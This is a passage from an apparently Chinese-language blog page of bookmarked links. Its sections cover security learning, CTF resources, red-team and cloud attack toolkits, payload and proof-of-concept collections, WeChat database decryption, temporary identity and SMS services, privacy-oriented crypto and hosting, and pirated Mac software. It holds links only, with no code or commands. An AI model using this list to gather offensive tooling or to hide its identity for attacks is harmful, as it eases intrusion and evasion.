data-url=\"aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2xhbmd1YWdlL2luZGV4Lmh0bWw=\">websec.readthedocs.io, Web 安全指南，https://websec.readthedocs.io/zh/latest/language/index.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubW9vbnNlYy5jb20v\">moonsec.com, MoonSec 安全社区，https://www.moonsec.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qaXNodTUuY29tL3Bvc3QvNjcuaHRtbA==\">jishu5.com, 技术小站，http://www.jishu5.com/post/67.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGRvc2kub3JnLw==\">ddosi.org, 分布式拒绝服务攻击平台，https://www.ddosi.org/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tLw==\">xz.aliyun.com, 阿里云安全中心，https://xz.aliyun.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJuZXdzLmNjL3BhZ2UvMw==\">hackernews.cc, 黑客新闻，https://hackernews.cc/page/3</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JlemFkdXR5L2N5YmVyc2VjdXJpdHktY2FyZWVyLXBhdGg=\">rezaduty/cybersecurity-career-path, 信息安全职业发展指南，https://github.com/rezaduty/cybersecurity-career-path</span></p>\n<h3 id=\"ctf知识\"><a class=\"markdownIt-Anchor\" href=\"#ctf知识\">#</a> CTF 知识</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0lnbml0ZXRlY2hub2xvZ2llcy9WdWxuaHViLUNURi1Xcml0ZXVwcw==\">Ignitetechnologies/Vulnhub-CTF-Writeups, Vulnhub CTF 解题报告，https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29saXN0MjEzL0luZm9ybWF0aW9uX1NlY3VyaXR5X0Jvb2tz\">olist213/Information_Security_Books, 信息安全书籍资源列表，https://github.com/olist213/Information_Security_Books</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9maXJtaWFuYXkuZ2l0Ym9vay5pby9jdGYtYWxsLWluLW9uZS8xX2Jhc2lj\">firmianay.gitbook.io/ctf-all-in-one, CTF 全攻略，https://firmianay.gitbook.io/ctf-all-in-one/1_basic</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==\">crackstation.net, 在线密码破解服务，https://crackstation.net/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGlyYWswL2RlZmF1bHQuaHRtbD9wYWdlPTM=\">cnblogs.com/hirak0, hirak0 的博客，https://www.cnblogs.com/hirak0/default.html?page=3</span></p>\n<h3 id=\"临时身份\"><a class=\"markdownIt-Anchor\" href=\"#临时身份\">#</a> 临时身份</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzI0bWFpbC5jaGFjdW8ubmV0L2VudXM=\">24mail.chacuo.net, 临时邮箱服务，http://24mail.chacuo.net/enus</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZ3VlcnJpbGxhbWFpbC5jb20vaW5ib3g=\">guerrillamail.com, Guerrilla Mail 临时邮箱，https://www.guerrillamail.com/inbox</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZW1wLW1haWwub3JnL2VuLw==\">temp-mail.org, Temp Mail 临时邮箱，https://temp-mail.org/en/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZW1wb3JhcnktcGhvbmUtbnVtYmVyLmNvbS8=\">temporary-phone-number.com, 临时手机号码服务，https://temporary-phone-number.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2hhb3dlaWNoaS5jb20v\">haoweichi.com, 临时身份生成，http://haoweichi.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGluc2hpLWVtYWlsLmNvbS8=\">linshi-email.com, 临时邮箱，https://www.linshi-email.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zbXMtYWN0aXZhdGUub3JnL2NuL2ZyZWVOdW1iZXJz\">sms-activate.org/cn/freeNumbers, 短信接码平台，https://sms-activate.org/cn/freeNumbers</span></p>\n<h3 id=\"区块链相关\"><a class=\"markdownIt-Anchor\" href=\"#区块链相关\">#</a> 区块链相关</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYml0Z28uY29tLw==\">bitgo.com, BitGo 数字资产托管服务，https://www.bitgo.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaHVvYmkuY29tL3poLWNuLw==\">huobi.com, 火币全球站，https://www.huobi.com/zh-cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmluYW5jZS5jb20vemgtQ04=\">binance.com, 币安交易所，https://www.binance.com/zh-CN</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxsZXQubXltb25lcm8uY29tLw==\">mymonero.com, MyMonero 钱包，https://wallet.mymonero.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWtzbWFuLm9yZy8=\">baksman.org, Baksman 数字货币兑换服务，https://baksman.org/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hY2NvdW50LnByb3Rvbi5tZS9sb2dpbg==\">account.proton.me, ProtonMail 账户登录，https://account.proton.me/login</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iaXRsYXVuY2guaW8vY24v\">bitlaunch.io, BitLaunch 云服务器，https://bitlaunch.io/cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob3N0c2FpbG9yLmNvbS8=\">hostsailor.com, HostSailor 云服务器，https://hostsailor.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuZ2V0bW9uZXJvLm9yZy96aC1jbi9jb21tdW5pdHkvbWVyY2hhbnRzL2luZGV4Lmh0bWw=\">web.getmonero.org, Monero 加密货币官方网站，https://web.getmonero.org/zh-cn/community/merchants/index.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09wZW5WUE4vZWFzeS1yc2EvYmxvYi9tYXN0ZXIvUkVBRE1FLnF1aWNrc3RhcnQubWQ=\">OpenVPN/easy-rsa, Easy-RSA 快速入门指南，https://github.com/OpenVPN/easy-rsa/blob/master/README.quickstart.md</span></p>\n<h3 id=\"微信数据库破解\"><a class=\"markdownIt-Anchor\" href=\"#微信数据库破解\">#</a> 微信数据库破解</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dyZXljb2RlZS93ZWNoYXQtYmFja3Vw\">greycodee/wechat-backup, 微信备份工具，https://github.com/greycodee/wechat-backup</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xhc3RpbmcteWFuZy9zcWxpdGVicm93c2Vy\">lasting-yang/sqlitebrowser, SQLite 数据库浏览器，https://github.com/lasting-yang/sqlitebrowser</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzI1OTI2NDgxL2FydGljbGUvZGV0YWlscy8xMjIzMjYzMTM=\">csdn.net, CSDN 博客文章，https://blog.csdn.net/sinat_25926481/article/details/122326313</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIwNDQzMzE3L2Fuc3dlci8xMTI3MTE4NjIx\">zhihu.com, 如何导出微信聊天记录，https://www.zhihu.com/question/20443317/answer/1127118621</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xMTE4MDI3NzY=\">zhuanlan.zhihu.com, SQLite 数据库入门教程，https://zhuanlan.zhihu.com/p/111802776</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3lzcHJlZW4vc3FsY2lwaGVyL2RvY2tlcmZpbGU=\">yspreen/sqlcipher, SQLCipher Docker 镜像，https://hub.docker.com/r/yspreen/sqlcipher/dockerfile</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xlYXBjb2RlL3B5c3FsY2lwaGVy\">leapcode/pysqlcipher, Python 连接和操作 SQLCipher 的库，https://github.com/leapcode/pysqlcipher</span></p>\n<h3 id=\"linux-命令\"><a class=\"markdownIt-Anchor\" href=\"#linux-命令\">#</a> Linux 命令</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2xpbnV4LjUxeWlwLmNvbS8=\">linux.51yip.com, Linux 命令大全，http://linux.51yip.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93YW5nY2h1amlhbmcuY29tL2xpbnV4LWNvbW1hbmQv\">wangchujiang.com, Linux 命令手册，https://wangchujiang.com/linux-command/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWk=\">bootschool.net, ASCII 艺术字符集，https://www.bootschool.net/ascii</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvODk2MDQzNDg4MDI5NjAwLzkwMDAwMzc2Nzc3NTQyNA==\">liaoxuefeng.com, 学习 git, https://www.liaoxuefeng.com/wiki/896043488029600/900003767775424</span></p>\n<h3 id=\"机场地址\"><a class=\"markdownIt-Anchor\" href=\"#机场地址\">#</a> 机场地址</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubW9qaWUubWUvIy9sb2dpbg==\">mojie.me, 魔戒云平台，https://www.mojie.me/#/login</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jYWlob25neXVuLm9uZS9pbmRleC5waHAjL2Rhc2hib2FyZA==\">caihongyun.one, 彩虹云在线工具，https://caihongyun.one/index.php#/dashboard</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qdXppeXVuODg4Lm5ldC9hdXRoL2xvZ2lu\">juziyun888.net, 聚资源云平台，https://juziyun888.net/auth/login</span></p>\n<h3 id=\"电影或电视剧\"><a class=\"markdownIt-Anchor\" href=\"#电影或电视剧\">#</a> 电影或电视剧</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94a3lzLnR2Lw==\">xkys.tv, 在线电影和电视剧，https://xkys.tv/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3ViLmNvbS9jb21tdW5pdHkvY2VsZWJyaXR5\">coub.com, 俄罗斯 Coub 频道，https://coub.com/community/celebrity</span></p>\n<h3 id=\"mac软件或插件\"><a class=\"markdownIt-Anchor\" href=\"#mac软件或插件\">#</a> mac 软件或插件</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHBzdG9ycmVudC5ydS8=\">appstorrent.ru, 应用程序和游戏种子下载，https://appstorrent.ru/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2pheXdjamxvdmUvYXdlc29tZS1tYWM=\">jaywcjlove/awesome-mac, Mac 应用程序资源列表，https://github.com/jaywcjlove/awesome-mac</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3poYW9vbGVlL0Nocm9tZUFwcEhlcm9lcw==\">zhaoolee/ChromeAppHeroes, Chrome 应用英雄榜，https://github.com/zhaoolee/ChromeAppHeroes</span></p>\n<h3 id=\"红队知识学习\"><a class=\"markdownIt-Anchor\" href=\"#红队知识学习\">#</a> 红队知识学习</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbQ==\">redcanaryco/atomic-red-team, 原子红队测试框架，https://github.com/redcanaryco/atomic-red-team</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dlMWgwL3JlZHRlYW0tdGlwcw==\">we1h0/redteam-tips, 红队技巧和建议，https://github.com/we1h0/redteam-tips</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2luZm9zZWNuMW5qYS9SZWQtVGVhbWluZy1Ub29sa2l0\">infosecn1nja/Red-Teaming-Toolkit, 红队工具集，https://github.com/infosecn1nja/Red-Teaming-Toolkit</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lleWludG1pbnRodWh0dXQvQXdlc29tZS1SZWQtVGVhbWluZw==\">yeyintminthuhtut/Awesome-Red-Teaming, 红队资源列表，https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hbnR2eWRhc2IvUmVkVGVhbWluZy1UYWN0aWNzLWFuZC1UZWNobmlxdWVz\">mantvydasb/RedTeaming-Tactics-and-Techniques, 红队战术和技术，https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nhcmxvc3BvbG9wL2hhY2t0cmlja3M=\">carlospolop/hacktricks, hacktricks 工具和技术，https://github.com/carlospolop/hacktricks</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3dlbGNvbWUvcmVhZG1l\">book.hacktricks.xyz, hacktricks 在线书籍，https://book.hacktricks.xyz/welcome/readme</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zd2lzc2t5cmVwby5naXRodWIuaW8vUGF5bG9hZHNBbGxUaGVUaGluZ3NXZWIv\">swisskyrepo/PayloadsAllTheThingsWeb, PayloadsAllTheThingsWeb 在线版本，https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdz\">swisskyrepo/PayloadsAllTheThings, PayloadsAllTheThings 资源库，https://github.com/swisskyrepo/PayloadsAllTheThings</span></p>\n<h3 id=\"attck\"><a class=\"markdownIt-Anchor\" href=\"#attck\">#</a> ATT&amp;CK</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FuZ3J5aXAvaXBzY2Fu\">angryip/ipscan, IP 扫描工具，https://github.com/angryip/ipscan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0J5cGFzczAwNy9FbWVyZ2VuY3ktUmVzcG9uc2UtTm90ZXM=\">Bypass007/Emergency-Response-Notes, 应急响应笔记，https://github.com/Bypass007/Emergency-Response-Notes</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ljZHhzYi9Qb2NPckV4cF9pbl9HaXRodWI=\">ycdxsb/PocOrExp_in_Github, PocOrExp_in_Github, https://github.com/ycdxsb/PocOrExp_in_Github</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25vbWktc2VjL1BvQy1pbi1HaXRIdWI=\">nomi-sec/PoC-in-GitHub, PoC-in-GitHub, https://github.com/nomi-sec/PoC-in-GitHub</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3phbjhpbi9hZnJvZw==\">zan8in/afrog, afrog, https://github.com/zan8in/afrog</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ncmV5Y29kZS50b3AvcG9zdHMvYW5kcm9pZC13ZWNoYXQtYmFrLw==\">greycode.top/posts/android-wechat-bak/, Android 微信备份解密工具，https://greycode.top/posts/android-wechat-bak/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHAuc2xhY2suY29tL2NsaWVudC9UMjBMVDdOSlgvQ1NOQzZGRlUw\">app.slack.com/client/T20LT7NJX/CSNC6FFU0, Slack, https://app.slack.com/client/T20LT7NJX/CSNC6FFU0</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5k\">BloodHoundAD/BloodHound, BloodHound, https://github.com/BloodHoundAD/BloodHound</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RydXN0ZWRzZWMvc29jaWFsLWVuZ2luZWVyLXRvb2xraXQv\">trustedsec/social-engineer-toolkit/, 社会工程学工具包，https://github.com/trustedsec/social-engineer-toolkit/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2loZWJza2kvRGVmYXVsdENyZWRzLWNoZWF0LXNoZWV0\">ihebski/DefaultCreds-cheat-sheet, 默认凭证速查表，https://github.com/ihebski/DefaultCreds-cheat-sheet</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnVna3UuY29tL21pbWEv\">www.bugku.com/mima/, 密码查询，https://www.bugku.com/mima/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYXZlaWJlZW5wd25lZC5jb20v\">haveibeenpwned.com/, Have I Been Pwned, https://haveibeenpwned.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb25pdG9yLmZpcmVmb3guY29tLw==\">monitor.firefox.com/, Firefox Monitor, https://monitor.firefox.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW5kYm94LnRpLnFpYW54aW4uY29tL3NhbmRib3gvcGFnZQ==\">sandbox.ti.qianxin.com/sandbox/page, 腾讯威胁情报沙箱，https://sandbox.ti.qianxin.com/sandbox/page</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWJvLnFxLmNvbS8=\">habo.qq.com/, HABO 沙箱，https://habo.qq.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhYmFjYWIvYXdlc29tZS1jeWJlcnNlY3VyaXR5LWJsdWV0ZWFt\">fabacab/awesome-cybersecurity-blueteam, Awesome Cybersecurity Blue Team, https://github.com/fabacab/awesome-cybersecurity-blueteam</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hlbGxvZXhwLzBkYXk=\">helloexp/0day, 0day 漏洞，https://github.com/helloexp/0day</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2xvdWR2dWxuZGIub3JnLw==\">www.cloudvulndb.org/, Cloud Vulnerabilities Database, https://www.cloudvulndb.org/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGVhbS1jeW1ydS5jb20vaXAtYXNuLW1hcHBpbmc=\">www.team-cymru.com/ip-asn-mapping, IP 和 ASN 映射查询，https://www.team-cymru.com/ip-asn-mapping</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly95dW4uY2xvdWRiaWxpdHkuY29tL2xvZ2luLmh0bWw=\">yun.cloudbility.com/login.html, Cloudbility 云安全，https://yun.cloudbility.com/login.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tlbHZpbkJlbi9BcHBJbmZvU2Nhbm5lcg==\">kelvinBen/AppInfoScanner, App 信息扫描工具，https://github.com/kelvinBen/AppInfoScanner</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01vYlNGL01vYmlsZS1TZWN1cml0eS1GcmFtZXdvcmstTW9iU0Y=\">MobSF/Mobile-Security-Framework-MobSF, 移动安全框架 MobSF, https://github.com/MobSF/Mobile-Security-Framework-MobSF</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3IweXN1ZS9yMGNhcHR1cmU=\">r0ysue/r0capture, r0capture, https://github.com/r0ysue/r0capture</span></p>\n<h3 id=\"云安全\"><a class=\"markdownIt-Anchor\" href=\"#云安全\">#</a> 云安全</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VzdGF5cmVhZHkvZmlyZXByb3g=\">ustayready/fireprox, AWS FireProx, https://github.com/ustayready/fireprox</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RhZnRoYWNrL01GQVN3ZWVw\">dafthack/MFASweep, MFA 扫描工具，https://github.com/dafthack/MFASweep</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhdXNlYy9Qb3dlclp1cmU=\">hausec/PowerZure, Azure 权限提升工具，https://github.com/hausec/PowerZure</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9NaWNyb0J1cnN0\">NetSPI/MicroBurst, Azure 云安全评估工具，https://github.com/NetSPI/MicroBurst</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4c2hhL0Nsb3VkQnJ1dGU=\">0xsha/CloudBrute, 云存储暴力破解工具，https://github.com/0xsha/CloudBrute</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FxdWFzZWN1cml0eS9jbG91ZHNwbG9pdA==\">aquasecurity/cloudsploit, CloudSploit, https://github.com/aquasecurity/cloudsploit</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RlcmFpbGVkL3BvcGV5ZQ==\">derailed/popeye, Popeye, https://github.com/derailed/popeye</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyYXJrL0t1YmlTY2Fu\">cyberark/KubiScan, KubiScan, https://github.com/cyberark/KubiScan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FxdWFzZWN1cml0eS90cml2eQ==\">aquasecurity/trivy, Trivy, https://github.com/aquasecurity/trivy</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Jyb21wd25pZS9ib3Ri\">brompwnie/botb, Botb, https://github.com/brompwnie/botb</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JoaW5vU2VjdXJpdHlMYWJzL2NjYXQ=\">RhinoSecurityLabs/ccat, Ccat, https://github.com/RhinoSecurityLabs/ccat</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nkay10ZWFtL0NESw==\">cdk-team/CDK, AWS CDK, https://github.com/cdk-team/CDK</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FxdWFzZWN1cml0eS9rdWJlLWh1bnRlcg==\">aquasecurity/kube-hunter, Kube-Hunter, https://github.com/aquasecurity/kube-hunter</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyYXJrL2t1YmVsZXRjdGw=\">cyberark/kubeletctl, Kubeletctl, https://github.com/cyberark/kubeletctl</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2t1YmVzY2FwZS9rdWJlc2NhcGU=\">kubescape/kubescape, Kubescape, https://github.com/kubescape/kubescape</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JoaW5vU2VjdXJpdHlMYWJzL3BhY3U=\">RhinoSecurityLabs/pacu, Pacu, https://github.com/RhinoSecurityLabs/pacu</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2luZ3VhcmRpYW5zL3BlaXJhdGVz\">inguardians/peirates, Peirates, https://github.com/inguardians/peirates</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JoaW5vU2VjdXJpdHlMYWJzL0Nsb3VkLVNlY3VyaXR5LVJlc2VhcmNoL3RyZWUvYjdkMTRiN2ViNTFiN2RlYTZlYTZhODk3ODY4MmJkOTY3MWUwZTE4My9BV1MvczNfYnVja2V0X2JydXRlZm9yY2Vy\">RhinoSecurityLabs/Cloud-Security-Research/tree/b7d14b7eb51b7dea6ea6a8978682bd9671e0e183/AWS/s3_bucket_bruteforcer, S3 Bucket Bruteforcer, https://github.com/RhinoSecurityLabs/Cloud-Security-Research/tree/b7d14b7eb51b7dea6ea6a8978682bd9671e0e183/AWS/s3_bucket_bruteforcer</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2pvcmRhbnBvdHRpL0Nsb3VkU2NyYXBlcg==\">jordanpotti/CloudScraper, CloudScraper, https://github.com/jordanpotti/CloudScraper</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dhZ29vZG1hbi9kaXZl\">wagoodman/dive, Dive, https://github.com/wagoodman/dive</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2thYmFjaG9vay9rOHMtc2VjdXJpdHkvdHJlZS9tYXN0ZXIvazhudW1lcmF0ZQ==\">kabachook/k8s-security/tree/master/k8numerate, K8numerate, https://github.com/kabachook/k8s-security/tree/master/k8numerate</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RlcmFpbGVkL2s5cw==\">derailed/k9s, K9s, https://github.com/derailed/k9s</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3F1YXJrc2xhYi9rZGlnZ2Vy\">quarkslab/kdigger, Kdigger, https://github.com/quarkslab/kdigger</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1Nob3BpZnkva3ViZWF1ZGl0\">Shopify/kubeaudit, Kubeaudit, https://github.com/Shopify/kubeaudit</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FxdWFzZWN1cml0eS9rdWJlLWJlbmNo\">aquasecurity/kube-bench, Kube-bench, https://github.com/aquasecurity/kube-bench</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvbnRyb2xwbGFuZWlvL2t1YmVzZWM=\">controlplaneio/kubesec, Kubesec, https://github.com/controlplaneio/kubesec</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZjaGlubmlwaWxsaS9rdWJlc3RyaWtlcg==\">vchinnipilli/kubestriker, Kubestriker, https://github.com/vchinnipilli/kubestriker</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3VwL1Njb3V0U3VpdGU=\">nccgroup/ScoutSuite, ScoutSuite, https://github.com/nccgroup/ScoutSuite</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hlcm9rdS90ZXJyaWVy\">heroku/terrier, Terrier, https://github.com/heroku/terrier</span></p>\n<h3 id=\"azure-安全\"><a class=\"markdownIt-Anchor\" href=\"#azure-安全\">#</a> Azure 安全</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0F6dXJlL2F6dXJlLXBvd2Vyc2hlbGw=\">Azure/azure-powershell, Azure PowerShell, https://github.com/Azure/azure-powershell</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01pY3Jvc29mdExlYXJuaW5nL0FaNTAwLUF6dXJlU2VjdXJpdHlUZWNobm9sb2dpZXM=\">MicrosoftLearning/AZ500-AzureSecurityTechnologies, AZ500 Azure Security Technologies, https://github.com/MicrosoftLearning/AZ500-AzureSecurityTechnologies</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0F6dXJlL0F6dXJlLVNlbnRpbmVs\">Azure/Azure-Sentinel, Azure Sentinel, https://github.com/Azure/Azure-Sentinel</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Jvb3RzZWNkZXYvQXp1cmUtUmVkLVRlYW0=\">rootsecdev/Azure-Red-Team, Azure Red Team, https://github.com/rootsecdev/Azure-Red-Team</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0F6dXJlL0F6dXJlLU5ldHdvcmstU2VjdXJpdHk=\">Azure/Azure-Network-Security, Azure Network Security, https://github.com/Azure/Azure-Network-Security</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2lkYWhvbGFiL01hbGNvbG0=\">idaholab/Malcolm, Malcolm, https://github.com/idaholab/Malcolm</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyZWFkbDBjay9uZXRjYXA=\">dreadl0ck/netcap, Netcap, https://github.com/dreadl0ck/netcap</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FjdGl2ZWNtL3JpdGE=\">activecm/rita, Rita, https://github.com/activecm/rita</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29kZWRzaGltb24vQnJ1dGVTaGFyaw==\">odedshimon/BruteShark, BruteShark, https://github.com/odedshimon/BruteShark</span></p>\n<h3 id=\"其他工具\"><a class=\"markdownIt-Anchor\" href=\"#其他工具\">#</a> 其他工具</h3>\n<p><span class=\"exturl\" 